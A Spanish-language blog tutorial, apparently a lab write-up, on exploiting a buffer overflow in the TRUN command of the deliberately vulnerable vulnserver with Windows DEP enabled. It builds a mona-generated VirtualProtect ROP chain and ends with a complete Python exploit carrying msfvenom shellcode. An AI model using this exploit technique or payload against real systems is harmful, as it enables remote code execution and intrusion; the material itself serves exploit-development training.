# Buffer-Overflow Bypass DEP vulnserver

[https://github.com/stephenbradshaw/vulnserver](https://github.com/stephenbradshaw/vulnserver)

Activamos el DEP en nuestro windows:

![Untitled](/assets/images/Buffer-Overflow-byp-dep/Untitled.png)

Como ya vimos en : 

vulnserver tiene 4 funciones en las que declara un buffer, cada buffer es distinto en cada función:

![Untitled](/assets/images/Buffer-Overflow-byp-dep/Untitled%201.png)

vulnserver tiene una funcionalidad que se llama TRUN la cual utiliza la funcion3 vista anteriormente, en esta condición podemos ver que se declara un buffer de 3000 en la que hay otra condición que para que se cumpla tiene que haber un ‘.’ en el input del usuario.

![Untitled](/assets/images/Buffer-Overflow-byp-dep/Untitled%202.png)

Si reflejamos esto en la practica, le pasamos a vulnserver esta cadena:

![Untitled](/assets/images/Buffer-Overflow-byp-dep/Untitled%203.png)

Miramos en el Inmunity Debugger y hemos conseguido crashear vulnserver y sobrescribir el EIP

![Untitled](/assets/images/Buffer-Overflow-byp-dep/Untitled%204.png)

Con mona miramos los modulos con el comando:

`!mona modules`

![Untitled](/assets/images/Buffer-Overflow-byp-dep/Untitled%205.png)

Vamos a probar con el primer modulo (libreria essfunc.dll) a crear un rop

![Untitled](/assets/images/Buffer-Overflow-byp-dep/Untitled%206.png)

essfunc no consigue hacer una llamada completa, por lo que tenemos que hacer uso de todas las librerias

![Untitled](/assets/images/Buffer-Overflow-byp-dep/Untitled%207.png)

[https://pastebin.com/n2vtXzr1](https://pastebin.com/n2vtXzr1)

Nos devuelve demasiadas posibilidades pero tenemos que ir probando uno a uno en mi caso los de python.

Voy a reutilizar el exploit que cree para el explotar la funcion TRUN, vulnerando la función TRUN.

```python
#!/usr/bin/python3

from pwn import *
from struct import pack

#CTRL+C
def def_handler(sig,frame):
	print("\n[!]Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	p1 = log.progress("Buffer-Overflow BypassDEP Vulnserver")

	
	buffer = b"A"*2006 
	buffer += b"B"*4
	buffer += b"C"*(3500-2006-4)
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect(('192.168.234.133', 9999))
	s.send(b'TRUN .' + buffer)
```

En este exploit conseguimos sobreescribir el EIP con 4 “B” y terminar de rellenar con “C”

![Untitled](/assets/images/Buffer-Overflow-byp-dep/Untitled%208.png)

Agregamos a nuestro exploit la función create_rop_chain que hemos sacado con mona:

```python
#!/usr/bin/python3

from pwn import *
from struct import pack

#CTRL+C
def def_handler(sig,frame):
	print("\n[!]Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

def create_rop_chain():

# rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
	#[---INFO:gadgets_to_set_esi:---]
	0x772d234a,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
	0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
	0x76a6fdb6,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] ** REBASED ** ASLR
	0x76b41470,  # XCHG EAX,ESI # RETN [WS2_32.DLL] ** REBASED ** ASLR
	#[---INFO:gadgets_to_set_ebp:---]
	0x75adfcb1,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR
	0x625011af,  # & jmp esp [essfunc.dll]
	#[---INFO:gadgets_to_set_ebx:---]
	0x77270b5d,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
	0xfffffdff,  # Value to negate, will become 0x00000201
	0x766b94ea,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR
	0x75aa7926,  # XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR
	#[---INFO:gadgets_to_set_edx:---]
	0x75b27dfb,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR
	0xffffffc0,  # Value to negate, will become 0x00000040
	0x766ba918,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR
	0x76a3b884,  # XCHG EAX,EDX # RETN [RPCRT4.dll] ** REBASED ** ASLR
	#[---INFO:gadgets_to_set_ecx:---]
	0x75ad8b52,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR
	0x76add416,  # &Writable location [RPCRT4.dll] ** REBASED ** ASLR
	#[---INFO:gadgets_to_set_edi:---]
	0x77423214,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR
	0x766ba91a,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
	#[---INFO:gadgets_to_set_eax:---]
	0x76aa79e6,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR
	0x90909090,  # nop
	#[---INFO:pushad:---]
	0x74250446,  # PUSHAD # RETN [mswsock.dll] ** REBASED ** ASLR
	]
	return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

def main():

    rop_chain = create_rop_chain()

    buffer = b"TRUN ."
    buffer += b"A"*2006
    buffer += rop_chain
    buffer += b"\xCC"*(3500-2006-(len(rop_chain)))

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.234.133", 9999))
        s.recv(1024)
        s.send(buffer)
        s.close()

    except Exception as e:
        print(e)

main()
```

![Untitled](/assets/images/Buffer-Overflow-byp-dep/Untitled%209.png)

Hemos omitido el DEP de Windows, (después de probar otros dos resultados del mona, si no funciona con el primero hay que probar con todos los demás). 

Ya solo nos queda incorporar nuestro payload creado con msfvenom al exploit, quedaría así:

```python
#!/usr/bin/python3

from pwn import *
from struct import pack

#CTRL+C
def def_handler(sig,frame):
	print("\n[!]Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

buf =  b""
buf += b"\xdb\xd1\xb8\xa8\xc9\xec\x25\xd9\x74\x24\xf4\x5b\x33"
buf += b"\xc9\xb1\x52\x31\x43\x17\x83\xc3\x04\x03\xeb\xda\x0e"
buf += b"\xd0\x17\x34\x4c\x1b\xe7\xc5\x31\x95\x02\xf4\x71\xc1"
buf += b"\x47\xa7\x41\x81\x05\x44\x29\xc7\xbd\xdf\x5f\xc0\xb2"
buf += b"\x68\xd5\x36\xfd\x69\x46\x0a\x9c\xe9\x95\x5f\x7e\xd3"
buf += b"\x55\x92\x7f\x14\x8b\x5f\x2d\xcd\xc7\xf2\xc1\x7a\x9d"
buf += b"\xce\x6a\x30\x33\x57\x8f\x81\x32\x76\x1e\x99\x6c\x58"
buf += b"\xa1\x4e\x05\xd1\xb9\x93\x20\xab\x32\x67\xde\x2a\x92"
buf += b"\xb9\x1f\x80\xdb\x75\xd2\xd8\x1c\xb1\x0d\xaf\x54\xc1"
buf += b"\xb0\xa8\xa3\xbb\x6e\x3c\x37\x1b\xe4\xe6\x93\x9d\x29"
buf += b"\x70\x50\x91\x86\xf6\x3e\xb6\x19\xda\x35\xc2\x92\xdd"
buf += b"\x99\x42\xe0\xf9\x3d\x0e\xb2\x60\x64\xea\x15\x9c\x76"
buf += b"\x55\xc9\x38\xfd\x78\x1e\x31\x5c\x15\xd3\x78\x5e\xe5"
buf += b"\x7b\x0a\x2d\xd7\x24\xa0\xb9\x5b\xac\x6e\x3e\x9b\x87"
buf += b"\xd7\xd0\x62\x28\x28\xf9\xa0\x7c\x78\x91\x01\xfd\x13"
buf += b"\x61\xad\x28\xb3\x31\x01\x83\x74\xe1\xe1\x73\x1d\xeb"
buf += b"\xed\xac\x3d\x14\x24\xc5\xd4\xef\xaf\x2a\x80\x05\xad"
buf += b"\xc3\xd3\xd9\xb3\xa8\x5d\x3f\xd9\xde\x0b\xe8\x76\x46"
buf += b"\x16\x62\xe6\x87\x8c\x0f\x28\x03\x23\xf0\xe7\xe4\x4e"
buf += b"\xe2\x90\x04\x05\x58\x36\x1a\xb3\xf4\xd4\x89\x58\x04"
buf += b"\x92\xb1\xf6\x53\xf3\x04\x0f\x31\xe9\x3f\xb9\x27\xf0"
buf += b"\xa6\x82\xe3\x2f\x1b\x0c\xea\xa2\x27\x2a\xfc\x7a\xa7"
buf += b"\x76\xa8\xd2\xfe\x20\x06\x95\xa8\x82\xf0\x4f\x06\x4d"
buf += b"\x94\x16\x64\x4e\xe2\x16\xa1\x38\x0a\xa6\x1c\x7d\x35"
buf += b"\x07\xc9\x89\x4e\x75\x69\x75\x85\x3d\x99\x3c\x87\x14"
buf += b"\x32\x99\x52\x25\x5f\x1a\x89\x6a\x66\x99\x3b\x13\x9d"
buf += b"\x81\x4e\x16\xd9\x05\xa3\x6a\x72\xe0\xc3\xd9\x73\x21"

def create_rop_chain():

# rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
	#[---INFO:gadgets_to_set_esi:---]
	0x772d234a,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
	0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
	0x76a6fdb6,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] ** REBASED ** ASLR
	0x76b41470,  # XCHG EAX,ESI # RETN [WS2_32.DLL] ** REBASED ** ASLR
	#[---INFO:gadgets_to_set_ebp:---]
	0x75adfcb1,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR
	0x625011af,  # & jmp esp [essfunc.dll]
	#[---INFO:gadgets_to_set_ebx:---]
	0x77270b5d,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
	0xfffffdff,  # Value to negate, will become 0x00000201
	0x766b94ea,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR
	0x75aa7926,  # XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR
	#[---INFO:gadgets_to_set_edx:---]
	0x75b27dfb,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR
	0xffffffc0,  # Value to negate, will become 0x00000040
	0x766ba918,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR
	0x76a3b884,  # XCHG EAX,EDX # RETN [RPCRT4.dll] ** REBASED ** ASLR
	#[---INFO:gadgets_to_set_ecx:---]
	0x75ad8b52,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR
	0x76add416,  # &Writable location [RPCRT4.dll] ** REBASED ** ASLR
	#[---INFO:gadgets_to_set_edi:---]
	0x77423214,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR
	0x766ba91a,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
	#[---INFO:gadgets_to_set_eax:---]
	0x76aa79e6,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR
	0x90909090,  # nop
	#[---INFO:pushad:---]
	0x74250446,  # PUSHAD # RETN [mswsock.dll] ** REBASED ** ASLR
	]
	return b''.join(struct.pack('<I', _) for _ in rop_gadgets)
# en python3 es importante que este en bytes por eso añado una "b"

def main():

    rop_chain = create_rop_chain()
    nop = b'\x90'*6 #agregamos 6 nops para que sea mas efectivo y no haya problema

    
    buffer = b"A"*2006
    buffer += rop_chain # llama a la funcion create_rop_chain()
    buffer += nop #NoOperation
    buffer += buf # nuestro payload de msfvenom
    buffer += b"\xCC"*(3500-2006-(len(rop_chain)-len(nop)-len(buf)))
		#Configuramos para terminar de rellenar con "C"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.234.133", 9999))
        s.recv(1024)
        s.send(b'TRUN .' + buffer)
        s.close()

    except Exception as e:
        print(e)

main()
```

![Untitled](/assets/images/Buffer-Overflow-byp-dep/Untitled%2010.png)